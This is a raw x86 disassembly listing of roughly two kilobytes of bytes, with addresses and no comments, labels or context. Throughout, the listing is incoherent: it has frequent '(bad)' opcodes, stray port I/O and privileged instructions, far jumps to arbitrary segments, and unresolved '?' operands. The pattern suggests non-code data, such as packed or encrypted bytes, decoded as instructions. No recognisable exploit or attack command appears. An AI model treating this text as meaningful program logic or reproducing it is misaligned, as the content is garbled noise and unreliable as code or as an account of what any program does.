  40d5a1:	xor    DWORD PTR [edi-0x46f680ba],0x6a2d401c
  40d5ab:	sbb    edx,DWORD PTR [edx-0x26372655]
  40d5b1:	aad    0x76
  40d5b3:	sub    BYTE PTR ds:0x2de8833c,ah
  40d5b9:	es push esi
  40d5bb:	sub    edx,DWORD PTR [edx+ebp*4+0x4d60887f]
  40d5c2:	inc    ecx
  40d5c3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40d5c5:	inc    ebx
  40d5c6:	jmp    0x40d5be
  40d5c8:	pushf  
  40d5c9:	xor    DWORD PTR [ecx],0xffffffa6
  40d5cc:	cmc    
  40d5cd:	xor    BYTE PTR ds:0xc687e64c,0x84
  40d5d4:	daa    
  40d5d5:	jae    0x40d560
  40d5d7:	stos   DWORD PTR es:[edi],eax
  40d5d8:	push   cs
  40d5d9:	(bad)  
  40d5da:	(bad)  
  40d5db:	js     0x40d63f
  40d5dd:	int    0x1c
  40d5df:	dec    edx
  40d5e0:	mov    ah,bh
  40d5e2:	dec    esp
  40d5e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5e4:	mov    ebp,0x63ddf88d
  40d5e9:	cmc    
  40d5ea:	or     eax,0x34d5de5b
  40d5ef:	(bad)  
  40d5f0:	in     al,0xa7
  40d5f2:	jbe    0x40d607
  40d5f4:	xor    BYTE PTR [esi-0xad650cc],dl
  40d5fa:	pop    ecx
  40d5fb:	lods   eax,DWORD PTR ds:[esi]
  40d5fc:	mov    esi,0xa04e0015
  40d601:	stos   DWORD PTR es:[edi],eax
  40d602:	ds sbb ecx,esi
  40d605:	cmp    eax,0xf4c81c73
  40d60a:	cwde   
  40d60b:	neg    BYTE PTR [bp-0x24]
  40d60f:	(bad)  
  40d610:	push   cs
  40d611:	cdq    
  40d612:	jmp    0x40d646
  40d614:	daa    
  40d615:	scas   al,BYTE PTR es:[edi]
  40d616:	pop    edx
  40d617:	inc    ebp
  40d618:	adc    DWORD PTR [esi+0x41788dc],ebx
  40d61e:	adc    DWORD PTR [edi-0x560f4ec],ebx
  40d624:	das    
  40d625:	jle    0x40d5de
  40d627:	inc    ecx
  40d628:	push   esp
  40d629:	rol    DWORD PTR [ebx],1
  40d62b:	push   edi
  40d62c:	je     0x40d67d
  40d62e:	and    al,BYTE PTR ds:0x2876d2e9
  40d634:	mov    edi,fs
  40d636:	xlat   BYTE PTR ds:[ebx]
  40d637:	int    0x7c
  40d639:	lea    esp,[ecx-0x7cdc9d5b]
  40d63f:	icebp  
  40d640:	das    
  40d641:	mov    es,WORD PTR [eax]
  40d643:	dec    eax
  40d644:	push   edx
  40d645:	in     al,0x1f
  40d647:	push   ds
  40d648:	jmp    0x40d6b2
  40d64a:	test   edx,ecx
  40d64c:	jl     0x40d642
  40d64e:	fisubr WORD PTR [eax]
  40d650:	xchg   edx,eax
  40d651:	ret    
  40d652:	fs xchg ecx,eax
  40d654:	fcomp  QWORD PTR [eax]
  40d656:	push   esp
  40d657:	retf   
  40d658:	ds pop es
  40d65a:	cmp    eax,0xa658d969
  40d65f:	mov    al,ds:0x905ecc94
  40d664:	or     al,BYTE PTR [esi+eax*1]
  40d667:	pop    ds
  40d668:	cmp    ch,BYTE PTR [ebx-0x59]
  40d66b:	rcr    DWORD PTR [ebp-0x7f],0x4f
  40d66f:	out    0x5d,eax
  40d671:	ins    BYTE PTR es:[edi],dx
  40d672:	std    
  40d673:	sbb    edi,ecx
  40d675:	test   eax,0xa4889bfe
  40d67a:	stos   DWORD PTR es:[edi],eax
  40d67b:	jp     0x40d686
  40d67d:	or     al,0x6
  40d67f:	test   eax,0x5abc2577
  40d684:	cmp    ecx,ebp
  40d686:	adc    ecx,DWORD PTR ds:0x9bf97d80
  40d68c:	mov    BYTE PTR [ecx],ch
  40d68e:	sub    bh,BYTE PTR ds:0x2ee26219
  40d694:	je     0x40d6ee
  40d696:	jbe    0x40d6f9
  40d698:	aad    0x70
  40d69a:	jne    0x40d6cc
  40d69c:	push   ebx
  40d69d:	call   0xdd723e60
  40d6a2:	(bad)  
  40d6a3:	aaa    
  40d6a4:	push   esp
  40d6a5:	xchg   BYTE PTR [ebp+0x1c],dh
  40d6a8:	inc    esp
  40d6a9:	push   ss
  40d6aa:	dec    edx
  40d6ab:	dec    ecx
  40d6ac:	fcmovbe st,st(7)
  40d6ae:	inc    esi
  40d6af:	loope  0x40d691
  40d6b1:	xor    DWORD PTR [ecx-0x22d68820],0x47
  40d6b8:	(bad)  [edi]
  40d6ba:	cld    
  40d6bb:	add    eax,0x60ba302d
  40d6c0:	fist   WORD PTR [ecx]
  40d6c2:	xchg   esi,eax
  40d6c3:	xchg   ebx,eax
  40d6c4:	and    bl,BYTE PTR [esi+0x40]
  40d6c7:	mov    ch,0x43
  40d6c9:	mov    eax,ds:0xe271fb7a
  40d6ce:	cmp    dl,BYTE PTR [edx+edx*1+0x20]
  40d6d2:	pop    ds
  40d6d3:	lods   eax,DWORD PTR ds:[esi]
  40d6d4:	mov    BYTE PTR [edx+edi*1+0x5f],bh
  40d6d8:	mov    edi,0x58852c86
  40d6dd:	inc    ebp
  40d6de:	cmp    bl,BYTE PTR [esi+eiz*8]
  40d6e1:	cmc    
  40d6e2:	call   0xd0c2:0x15c01a2
  40d6e9:	sbb    eax,0x88f8ea6f
  40d6ee:	sar    DWORD PTR [ebx-0x51],1
  40d6f1:	push   ebx
  40d6f2:	xchg   ebp,eax
  40d6f3:	lock in al,0x5
  40d6f6:	call   0x195514ad
  40d6fb:	mov    ds:0x5f583c05,eax
  40d700:	xor    dl,BYTE PTR [edx-0x4a]
  40d703:	jle    0x40d686
  40d705:	xchg   ebp,eax
  40d706:	or     al,dl
  40d708:	sbb    ebx,DWORD PTR [ebx+0x27611ad6]
  40d70e:	in     al,dx
  40d70f:	imul   edi,esp,0xffffffa7
  40d712:	jmp    0x5d00:0x9b3a69a
  40d719:	shl    bh,cl
  40d71b:	xor    eax,0xf6c11f36
  40d720:	inc    esp
  40d721:	fnstsw WORD PTR [esi-0x72ba15]
  40d727:	fsubr  DWORD PTR [ecx-0x35]
  40d72a:	inc    edx
  40d72b:	pop    ss
  40d72c:	pop    ebx
  40d72d:	dec    ebp
  40d72e:	xchg   BYTE PTR [esi+esi*8+0x2b090c0a],bl
  40d735:	popa   
  40d736:	mov    BYTE PTR [esi-0x56],al
  40d739:	pop    ecx
  40d73a:	push   es
  40d73b:	popa   
  40d73c:	fild   DWORD PTR [esi+0x6c]
  40d73f:	pushf  
  40d740:	or     DWORD PTR [esi],0x3d
  40d743:	es shl esp,0x9a
  40d747:	out    0x40,al
  40d749:	stos   DWORD PTR es:[edi],eax
  40d74a:	jnp    0x40d6e8
  40d74c:	jl     0x40d6fb
  40d74e:	popa   
  40d74f:	pop    eax
  40d750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d751:	and    eax,0xdcbd41fd
  40d756:	inc    edx
  40d757:	inc    ecx
  40d758:	and    BYTE PTR [ecx],cl
  40d75a:	leave  
  40d75b:	sub    DWORD PTR [edx+0x10],esp
  40d75e:	(bad)  
  40d75f:	in     al,dx
  40d760:	jl     0x40d79e
  40d762:	jmp    0x7fb1:0x75c9038c
  40d769:	retf   0x77af
  40d76c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d76d:	jo     0x40d721
  40d76f:	sbb    BYTE PTR [ecx],ch
  40d771:	or     ch,BYTE PTR [edx+eiz*2+0x6b5b792]
  40d778:	add    bh,BYTE PTR [edi+0x28]
  40d77b:	popf   
  40d77c:	jnp    0x40d751
  40d77e:	outs   dx,DWORD PTR ds:[esi]
  40d77f:	sbb    BYTE PTR [ebp-0x4],al
  40d782:	adc    cl,al
  40d784:	idiv   dh
  40d786:	ins    DWORD PTR es:[edi],dx
  40d787:	inc    esp
  40d788:	cs pop edx
  40d78a:	adc    DWORD PTR [esi],0x603189c5
  40d790:	fnsave [ebx-0x71]
  40d793:	adc    eax,0x961b2529
  40d798:	into   
  40d799:	mov    bh,0x80
  40d79b:	ficomp WORD PTR [eax-0x69]
  40d79e:	cmp    DWORD PTR [edx+0x2e],esi
  40d7a1:	sar    ah,cl
  40d7a3:	push   es
  40d7a4:	fistp  QWORD PTR [ecx]
  40d7a6:	cmp    al,0x9f
  40d7a8:	jae    0x40d7e3
  40d7aa:	test   al,0xf5
  40d7ac:	(bad)  
  40d7ad:	int    0x85
  40d7af:	addr16 dec esi
  40d7b1:	(bad)  
  40d7b2:	fbstp  TBYTE PTR [edi]
  40d7b4:	dec    ebx
  40d7b5:	imul   edi,DWORD PTR [esi-0xef85e28],0x1903e15b
  40d7bf:	dec    ebp
  40d7c0:	(bad)  
  40d7c2:	shl    DWORD PTR [edx+0x1033a5a2],1
  40d7c8:	leave  
  40d7c9:	bswap  ebx
  40d7cb:	scas   al,BYTE PTR es:[edi]
  40d7cc:	test   DWORD PTR [edx-0x27],0x722f1da4
  40d7d3:	push   ss
  40d7d4:	outs   dx,BYTE PTR ds:[esi]
  40d7d5:	not    DWORD PTR [ebp+0x3]
  40d7d8:	mov    dl,0x5
  40d7da:	jnp    0x40d76a
  40d7dc:	ror    DWORD PTR [esi+0x52a59025],cl
  40d7e2:	gs push ebx
  40d7e4:	fsubr  st,st(0)
  40d7e6:	mov    bl,0xc4
  40d7e8:	add    DWORD PTR [edx],eax
  40d7ea:	pop    esi
  40d7eb:	xchg   DWORD PTR [ebx+esi*2+0x599392f],esi
  40d7f2:	push   edi
  40d7f3:	jl     0x40d7e6
  40d7f5:	push   ecx
  40d7f6:	(bad)  
  40d7f9:	xor    cl,BYTE PTR [ebx-0x3c]
  40d7fc:	mov    fs,WORD PTR [ecx-0x6e]
  40d7ff:	repz mov esi,0xd9b44dee
  40d805:	jb     0x40d7c7
  40d807:	mov    cl,0x1e
  40d809:	adc    ecx,edx
  40d80b:	xchg   dh,bh
  40d80d:	arpl   WORD PTR [edx+eiz*1-0x5f],si
  40d811:	std    
  40d812:	mov    bh,0xa2
  40d814:	rcl    BYTE PTR [ebx+esi*1+0x7cf10a63],cl
  40d81b:	daa    
  40d81c:	sub    eax,esi
  40d81e:	and    bh,BYTE PTR [ecx-0x38]
  40d821:	or     DWORD PTR [ebp-0x2e2cd856],ebx
  40d827:	repz in al,0xef
  40d82a:	mov    dh,BYTE PTR [edi+0x137d7182]
  40d830:	fcom   DWORD PTR [eax+0x24]
  40d833:	rcr    DWORD PTR [ebx+0x14],cl
  40d836:	arpl   bp,si
  40d838:	lods   eax,DWORD PTR ds:[esi]
  40d839:	mov    db5,edx
  40d83c:	sbb    al,0x75
  40d83e:	aaa    
  40d83f:	arpl   WORD PTR [ebx-0xd89e2a2],cx
  40d845:	fidivr WORD PTR [edi+ebx*4-0x4c]
  40d849:	jle    0x40d879
  40d84b:	repz sub BYTE PTR [esi+edx*2-0x49],dh
  40d850:	int3   
  40d851:	retf   0x4c76
  40d854:	mov    al,ds:0x6aac4112
  40d859:	jg     0x40d842
  40d85b:	das    
  40d85c:	rol    BYTE PTR [ecx+0x5db511e5],0xc1
  40d863:	adc    edx,DWORD PTR [esi+0x2c33252f]
  40d869:	mov    dl,0x2d
  40d86b:	jb     0x40d830
  40d86d:	test   BYTE PTR [ebp+0x60a995a6],0xdb
  40d874:	xor    al,dl
  40d876:	(bad)  
  40d877:	cmp    edi,DWORD PTR [edi+0x36f59b1c]
  40d87d:	ins    BYTE PTR es:[edi],dx
  40d87e:	call   0xe9b:0xfe6b9880
  40d885:	data16 in al,0xfa
  40d888:	mov    ebx,0x57d757a
  40d88d:	sbb    al,0xd2
  40d88f:	add    dl,BYTE PTR [ecx+0x37317308]
  40d895:	(bad)  [edi-0x60b0012c]
  40d89b:	(bad)  
  40d89c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d89d:	(bad)  
  40d89f:	imul   esp,edi,0xcd3f85fe
  40d8a5:	daa    
  40d8a6:	iret   
  40d8a7:	add    eax,0xc73deb27
  40d8ac:	fidiv  WORD PTR [esp+ecx*8-0xee5cfa1]
  40d8b3:	jge    0x40d84d
  40d8b5:	popa   
  40d8b6:	add    eax,0xf8123617
  40d8bb:	and    ecx,DWORD PTR [esi+edx*4+0x10]
  40d8bf:	or     eax,0x272571f2
  40d8c4:	int    0x94
  40d8c6:	jmp    0x4a7b7266
  40d8cb:	push   ss
  40d8cc:	cmc    
  40d8cd:	rcl    esp,1
  40d8cf:	leave  
  40d8d0:	add    BYTE PTR [eax-0x5135af6a],0xf4
  40d8d7:	int    0x94
  40d8d9:	loop   0x40d93a
  40d8db:	dec    ebp
  40d8dc:	shr    DWORD PTR [ebx-0x50],0xf2
  40d8e0:	mov    bh,0xe1
  40d8e2:	dec    esi
  40d8e3:	punpcklbw mm1,mm3
  40d8e6:	retf   0xffec
  40d8e9:	stc    
  40d8ea:	out    dx,eax
  40d8eb:	adc    esi,DWORD PTR [esi-0x530be1a4]
  40d8f1:	outs   dx,BYTE PTR ds:[esi]
  40d8f2:	ror    dh,cl
  40d8f4:	sub    eax,0xc1519469
  40d8f9:	lods   eax,DWORD PTR ds:[esi]
  40d8fa:	jmp    0x82a6:0x20446634
  40d901:	daa    
  40d902:	sbb    eax,0xaed48d66
  40d907:	adc    esi,esi
  40d909:	ja     0x40d943
  40d90b:	(bad)  
  40d90c:	es push ecx
  40d90e:	cld    
  40d90f:	cmp    edi,ebx
  40d911:	pop    edx
  40d912:	pop    esp
  40d913:	and    ch,BYTE PTR [edi-0x74e49040]
  40d919:	and    DWORD PTR [esi],0xffffffaa
  40d91c:	adc    al,0xef
  40d91e:	push   DWORD PTR [edx+0x30b8640c]
  40d924:	call   0xe521f7e2
  40d929:	jg     0x40d990
  40d92b:	push   es
  40d92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d92d:	push   esp
  40d92e:	dec    ebp
  40d92f:	fwait
  40d930:	add    BYTE PTR [esi],dl
  40d932:	ds sti 
  40d934:	inc    esi
  40d935:	add    cl,BYTE PTR [ebp-0x23a0c229]
  40d93b:	out    0xfb,al
  40d93d:	jo     0x40d955
  40d93f:	sbb    edi,DWORD PTR [edx+eax*4]
  40d942:	pop    eax
  40d943:	pop    ebx
  40d944:	int    0x4f
  40d946:	aas    
  40d947:	popa   
  40d948:	test   ecx,eax
  40d94a:	mov    es,WORD PTR [edi]
  40d94c:	push   ss
  40d94d:	xchg   edx,eax
  40d94e:	rcl    dh,0x95
  40d951:	jno    0x40d8d8
  40d953:	retf   0x696f
  40d956:	xor    ecx,0x30
  40d959:	loope  0x40d966
  40d95b:	pop    edi
  40d95c:	mov    eax,0x402c7aa5
  40d961:	xor    BYTE PTR [esi+0x6efdd5a0],ch
  40d967:	pop    esp
  40d968:	xor    ch,dh
  40d96a:	jl     0x40d99b
  40d96c:	mov    esp,0x6903f077
  40d971:	dec    esi
  40d972:	jle    0x40d932
  40d974:	mov    eax,ds:0x787d46fc
  40d979:	sbb    eax,0x1aa7499d
  40d97e:	jecxz  0x40d9d2
  40d980:	icebp  
  40d981:	cmp    DWORD PTR [ecx-0x45],ebp
  40d984:	pop    esp
  40d985:	fmul   QWORD PTR [ebp+0x2a]
  40d988:	(bad)  
  40d98a:	js     0x40d924
  40d98c:	cwde   
  40d98d:	push   ecx
  40d98e:	add    dh,al
  40d990:	push   es
  40d991:	scas   eax,DWORD PTR es:[edi]
  40d992:	imul   BYTE PTR [edx-0x85f34f8]
  40d998:	push   0xdbf9a5ea
  40d99d:	cs or  al,0xdd
  40d9a0:	push   DWORD PTR [ecx+ebp*1+0x1148b9de]
  40d9a7:	mov    eax,ds:0xa132a800
  40d9ac:	pop    ds
  40d9ad:	adc    cl,BYTE PTR [edx]
  40d9af:	push   ss
  40d9b0:	mov    BYTE PTR [ecx],al
  40d9b2:	ror    BYTE PTR [ebp-0x47],1
  40d9b5:	push   ss
  40d9b6:	inc    ebp
  40d9b7:	add    edi,0x38
  40d9ba:	adc    DWORD PTR [esi+0x2616a74c],eax
  40d9c0:	mov    ebx,0xa0555a82
  40d9c5:	push   es
  40d9c6:	jo     0x40d9d2
  40d9c8:	sbb    ebp,DWORD PTR [ebx+0xd495d5b]
  40d9ce:	inc    ebp
  40d9cf:	cli    
  40d9d0:	mov    ah,BYTE PTR [ebx+ebp*1]
  40d9d3:	cmp    ch,dh
  40d9d5:	xor    al,0x15
  40d9d7:	cmp    al,0xbd
  40d9d9:	dec    edi
  40d9da:	scas   al,BYTE PTR es:[edi]
  40d9db:	lahf   
  40d9dc:	shr    BYTE PTR [edx],cl
  40d9de:	rcr    BYTE PTR [ecx],1
  40d9e0:	jle    0x40da19
  40d9e2:	mov    edx,ds
  40d9e4:	mov    ah,0x63
  40d9e6:	cdq    
  40d9e7:	mov    WORD PTR [eax+eiz*8+0x1c],?
  40d9eb:	jbe    0x40da01
  40d9ed:	out    dx,al
  40d9ee:	aas    
  40d9ef:	imul   ebp,DWORD PTR [ebx],0x70
  40d9f2:	jno    0x40d9db
  40d9f4:	fs jns 0x40da74
  40d9f7:	test   BYTE PTR [esi-0x2b44339f],bh
  40d9fd:	cmp    BYTE PTR [edi],0x7e
  40da00:	or     DWORD PTR [edi+0x13d55227],eax
  40da06:	xchg   ebx,eax
  40da07:	and    eax,0x95a2fb07
  40da0c:	mov    eax,ds:0xb9143c94
  40da11:	mov    ebx,0x535be415
  40da16:	fwait
  40da17:	inc    esi
  40da18:	cdq    
  40da19:	jb     0x40d9e0
  40da1b:	(bad)  
  40da1c:	mov    edx,0xb83bd0bc
  40da21:	pop    ecx
  40da22:	and    dl,cl
  40da24:	clc    
  40da25:	push   es
  40da26:	push   es
  40da27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da28:	and    cl,cl
  40da2a:	mov    edx,0x4dc2f241
  40da2f:	in     al,0x1f
  40da31:	sahf   
  40da32:	and    ch,dl
  40da34:	in     al,dx
  40da35:	push   ss
  40da36:	pop    eax
  40da37:	popf   
  40da38:	and    eax,0x39dd06e4
  40da3d:	nop
  40da3e:	inc    edi
  40da3f:	adc    al,0x54
  40da41:	repnz mov edi,0x6f201c50
  40da47:	jmp    DWORD PTR [edi+0x65]
  40da4a:	mov    cl,0x81
  40da4c:	(bad)  
  40da4d:	pusha  
  40da4e:	inc    ecx
  40da4f:	push   ecx
  40da50:	push   edx
  40da51:	xchg   ch,cl
  40da53:	and    DWORD PTR [ebx+ebx*2],ebx
  40da56:	lock xor ch,BYTE PTR ds:0xd336ab82
  40da5d:	add    esp,DWORD PTR [ebp-0x17009e41]
  40da63:	push   ebp
  40da64:	dec    ebp
  40da65:	mov    eax,0xa046cf9b
  40da6a:	sub    al,0xe6
  40da6c:	imul   esp,ebp,0x7a4c1807
  40da72:	es mov eax,0xf5687a9a
  40da78:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da7a:	jb     0x40da7c
  40da7c:	ror    BYTE PTR [eax+0x2ac8223a],cl
  40da82:	je     0x40da33
  40da84:	and    al,0xa2
  40da86:	mov    cl,0x87
  40da88:	xchg   esi,eax
  40da89:	push   edx
  40da8a:	test   DWORD PTR [ecx-0x4],0x72115542
  40da91:	push   es
  40da92:	mov    edx,0xd188967e
  40da97:	sub    ebx,DWORD PTR ds:0xf06eb8df
  40da9d:	add    al,0xbe
  40da9f:	js     0x40da32
  40daa1:	or     al,0x82
  40daa3:	push   ss
  40daa4:	sub    ebp,esp
  40daa6:	xor    eax,0x2a793d76
  40daab:	icebp  
  40daac:	fs pop ebx
  40daae:	jmp    0xeb517513
  40dab3:	mov    eax,0xc2a50a60
  40dab8:	scas   al,BYTE PTR es:[edi]
  40dab9:	scas   al,BYTE PTR es:[edi]
  40daba:	ins    BYTE PTR es:[edi],dx
  40dabb:	loop   0x40db32
  40dabd:	inc    eax
  40dabe:	daa    
  40dabf:	adc    al,0xae
  40dac1:	sub    BYTE PTR [edx],0x99
  40dac4:	ds push 0x9dfc599a
  40daca:	shl    ch,0xbc
  40dacd:	call   0x6db2:0x861c6304
  40dad4:	pop    esp
  40dad5:	lahf   
  40dad6:	aam    0x15
  40dad8:	sahf   
  40dad9:	jo     0x40da80
  40dadb:	ror    DWORD PTR [edi+0x4d],cl
  40dade:	fist   WORD PTR [edx+0xac8d6c6]
  40dae4:	fstp   QWORD PTR [ebx-0x7ce59fbf]
  40daea:	loopne 0x40db01
  40daec:	dec    ebx
  40daed:	mov    bh,BYTE PTR [ebx]
  40daef:	cmp    bl,ah
  40daf1:	pop    edi
  40daf2:	fadd   QWORD PTR [eax]
  40daf4:	stc    
  40daf5:	dec    edx
  40daf6:	iret   
  40daf7:	aad    0x97
  40daf9:	popf   
  40dafa:	(bad)  
  40dafb:	fdiv   QWORD PTR [ecx]
  40dafd:	ret    
  40dafe:	jnp    0x40db6a
  40db00:	fsub   QWORD PTR [ecx+0xb]
  40db03:	out    0x70,al
  40db05:	test   dh,ah
  40db07:	or     BYTE PTR [eax-0x79],al
  40db0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db0b:	fld    TBYTE PTR [edx]
  40db0d:	je     0x40daf8
  40db0f:	add    ch,BYTE PTR [ebp+0x4da5e150]
  40db15:	out    0x89,al
  40db17:	xchg   ecx,eax
  40db18:	cmp    DWORD PTR [ebx-0xf69cb19],ecx
  40db1e:	push   ebp
  40db1f:	jno    0x40dab0
  40db21:	pop    esi
  40db22:	cwde   
  40db23:	mov    eax,0x181dcf77
  40db28:	adc    BYTE PTR [edx],0x16
  40db2b:	xor    bh,bl
  40db2d:	mov    eax,ds:0x603f151e
  40db32:	push   ecx
  40db33:	shl    eax,1
  40db35:	ret    
  40db36:	data16 sub bl,BYTE PTR [ebx+0x7a]
  40db3a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40db3c:	adc    DWORD PTR [eax],ebp
  40db3e:	adc    esi,DWORD PTR [esp+esi*2]
  40db41:	jl     0x40dadf
  40db43:	sbb    al,0x9f
  40db45:	pop    esi
  40db46:	mov    ch,BYTE PTR [ebx-0x20]
  40db49:	xchg   DWORD PTR [ecx+0x3c0e1db6],ebx
  40db4f:	jbe    0x40db21
  40db51:	xchg   esi,eax
  40db52:	mov    edx,0xbdca1fa4
  40db57:	sti    
  40db58:	ins    DWORD PTR es:[edi],dx
  40db59:	sub    esp,DWORD PTR ds:0x7d840159
  40db5f:	outs   dx,BYTE PTR ds:[esi]
  40db60:	ja     0x40db97
  40db62:	sbb    BYTE PTR [ebx],ch
  40db64:	mov    esp,DWORD PTR [esi+0x5f13e49]
  40db6a:	mov    ebp,0xea0abe
  40db6f:	lods   eax,DWORD PTR ds:[esi]
  40db70:	or     ebp,ebx
  40db72:	mov    edi,0x7c767b3d
  40db77:	xchg   esi,eax
  40db78:	fwait
  40db79:	xor    ebx,DWORD PTR fs:[ecx+0x58d9deb9]
  40db80:	push   edi
  40db81:	ret    0x28cf
  40db84:	inc    esi
  40db85:	imul   esp,DWORD PTR [ebx],0x2344e865
  40db8b:	test   eax,0xe5364088
  40db90:	xlat   BYTE PTR ds:[ebx]
  40db91:	ss inc eax
  40db93:	(bad)  
  40db94:	jge    0x40db21
  40db96:	push   esi
  40db97:	call   0x2b02e088
  40db9c:	call   DWORD PTR [ecx-0x6a651b4]
  40dba2:	push   ss
  40dba3:	xor    al,0x57
  40dba5:	xchg   BYTE PTR [eax+0x65],dl
  40dba8:	sti    
  40dba9:	inc    eax
  40dbaa:	push   eax
  40dbab:	push   ecx
  40dbac:	imul   ecx,DWORD PTR [edx],0x441e002c
  40dbb2:	adc    dh,BYTE PTR ds:0xf1c1f673
  40dbb8:	fnstcw WORD PTR [ecx]
  40dbba:	addr16 dec edi
  40dbbc:	mov    ebp,0xc2437da9
  40dbc1:	add    al,0x88
  40dbc3:	sub    eax,DWORD PTR [edx+ebx*4]
  40dbc6:	push   eax
  40dbc7:	mov    esp,0x77d77d94
  40dbcc:	inc    ebx
  40dbcd:	test   eax,0xc665bfad
  40dbd3:	cwde   
  40dbd4:	pop    esi
  40dbd5:	clc    
  40dbd6:	fbstp  TBYTE PTR ds:0x45913e0e
  40dbdc:	mov    dh,BYTE PTR ds:0xc43ad1f4
  40dbe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbe3:	sbb    edx,DWORD PTR [esi+0x52]
  40dbe6:	mov    ?,WORD PTR ds:[ebx-0x56cf5af2]
  40dbed:	xor    dh,BYTE PTR [ecx+0x28b7932b]
  40dbf3:	lods   eax,DWORD PTR ds:[esi]
  40dbf4:	cmp    esp,eax
  40dbf6:	(bad)  
  40dbf7:	ss stos BYTE PTR es:[edi],al
  40dbf9:	in     eax,dx
  40dbfa:	iret   
  40dbfb:	pushf  
  40dbfc:	sbb    DWORD PTR [esi-0x60],0x1b998898
  40dc03:	loope  0x40dbe4
  40dc05:	add    DWORD PTR [edx-0x1d],ebx
  40dc08:	dec    ebp
  40dc09:	inc    edi
  40dc0a:	sbb    DWORD PTR [ecx+edi*1-0x4de6172d],esp
  40dc11:	push   ds
  40dc12:	scas   eax,DWORD PTR es:[edi]
  40dc13:	jg     0x40dc83
  40dc15:	hlt    
  40dc16:	xchg   DWORD PTR [eax],edx
  40dc18:	mov    eax,ds:0x1689384b
  40dc1d:	jecxz  0x40dbab
  40dc1f:	pop    esp
  40dc20:	xor    DWORD PTR [edx-0x40],ebx
  40dc23:	pop    ebx
  40dc24:	sbb    dh,BYTE PTR [edx*8+0x75c0b0cd]
  40dc2b:	fstp   DWORD PTR [ebx]
  40dc2d:	sub    bh,cl
  40dc2f:	and    al,0x34
  40dc31:	ja     0x40dc35
  40dc33:	pop    edx
  40dc34:	ins    BYTE PTR es:[edi],dx
  40dc35:	scas   al,BYTE PTR es:[edi]
  40dc36:	popa   
  40dc37:	(bad)  [edi-0x282e5f55]
  40dc3d:	inc    esp
  40dc3e:	cmp    al,0xd1
  40dc40:	sub    dl,BYTE PTR [edx+esi*1+0x428ab968]
  40dc47:	hlt    
  40dc48:	dec    eax
  40dc49:	and    BYTE PTR [ebx-0x23],0x82
  40dc4d:	xor    al,0xf2
  40dc4f:	jge    0x40dc5b
  40dc51:	ss and al,0xd2
  40dc54:	mov    esi,0x8e3a2bdf
  40dc59:	stc    
  40dc5a:	dec    edi
  40dc5b:	mov    ebp,0xa2ec3ea6
  40dc60:	aad    0xc2
  40dc62:	fbld   TBYTE PTR [edi+0x2f104378]
  40dc68:	repz cld 
  40dc6a:	aad    0x95
  40dc6c:	das    
  40dc6d:	dec    edx
  40dc6e:	imul   ecx,DWORD PTR [ecx-0xf],0x8cce3504
  40dc75:	adc    al,0xfd
  40dc77:	daa    
  40dc78:	cs jmp 0x20d3:0xe2f0089d
  40dc80:	push   ebp
  40dc81:	inc    ecx
  40dc82:	pop    edx
  40dc83:	sbb    al,0x7d
  40dc85:	or     DWORD PTR [eax-0x71502885],esi
  40dc8b:	cli    
  40dc8c:	imul   ax,WORD PTR [esi-0x70],0x36
  40dc91:	mov    ebx,0xe2ee4192
  40dc96:	xchg   ebp,eax
  40dc97:	push   edi
  40dc98:	jno    0x40dce2
  40dc9a:	push   esi
  40dc9b:	push   cs
  40dc9c:	or     DWORD PTR [edi+0x26],edx
  40dc9f:	std    
  40dca0:	mov    es,WORD PTR [esi+0x25]
  40dca3:	mov    ?,WORD PTR [edx-0x33c195a4]
  40dca9:	pop    ds
  40dcaa:	jmp    0xeb25:0x7e3ca3c
  40dcb1:	dec    esp
  40dcb2:	jb     0x40dc3b
  40dcb4:	rdpmc  
  40dcb6:	jbe    0x86ae8937
  40dcbc:	scas   eax,DWORD PTR es:[edi]
  40dcbd:	adc    dh,dh
  40dcbf:	clc    
  40dcc0:	jns    0x40dd33
  40dcc2:	jge    0x40dcaa
  40dcc4:	(bad)  
  40dcc5:	arpl   WORD PTR [eax],dx
  40dcc7:	addr16 mov ah,0x3f
  40dcca:	mov    bh,0xca
  40dccc:	sub    eax,0xfd010c54
  40dcd1:	inc    esi
  40dcd2:	cmp    dl,0x9
  40dcd5:	les    edx,FWORD PTR [edx+0x5f]
  40dcd8:	and    eax,0x1b23a1aa
  40dcdd:	into   
  40dcde:	mov    edi,0xdc0f49d9
  40dce3:	mov    DWORD PTR [esi-0x78ddec86],edi
  40dce9:	xor    esp,DWORD PTR [ebx+0x2d0e452a]
  40dcef:	fimul  WORD PTR [ecx-0xa9861b4]
  40dcf5:	mov    BYTE PTR [ecx+0x70],cl
  40dcf8:	fdivr  QWORD PTR [edx]
  40dcfa:	jmp    0x40dd03
  40dcfc:	push   ss
  40dcfd:	ins    BYTE PTR es:[edi],dx
  40dcfe:	fcmovnb st,st(1)
  40dd00:	xor    BYTE PTR [eax-0x77],bh
  40dd03:	out    0xe5,al
  40dd05:	les    esi,FWORD PTR [edi-0x1c]
  40dd08:	cwde   
  40dd09:	pop    es
  40dd0a:	adc    BYTE PTR [ebx+0xf75501a],ch
  40dd10:	cmp    ebx,esp
  40dd12:	mov    esp,0x97d98baf
  40dd17:	add    eax,0xfcec52a5
  40dd1c:	mov    ecx,0x85508875
  40dd21:	gs sahf 
  40dd23:	leave  
  40dd24:	mov    cl,dh
  40dd26:	mov    eax,ds:0x82a4cc22
  40dd2b:	sbb    al,0xf8
  40dd2d:	push   ss
  40dd2e:	inc    esi
  40dd2f:	(bad)  
  40dd30:	repz sub DWORD PTR [eax+0x20aeb9a],0x18f9488a
  40dd3b:	jp     0x40dd3f
  40dd3d:	pop    ecx
  40dd3e:	adc    DWORD PTR [ebp-0x71d9be70],eax
  40dd44:	out    0xeb,eax
  40dd46:	ficom  DWORD PTR [ebp-0x2d7162fa]
  40dd4c:	mov    cl,0xed
  40dd4e:	jl     0x40dd55
  40dd50:	pop    ebp
  40dd51:	adc    al,0xfa
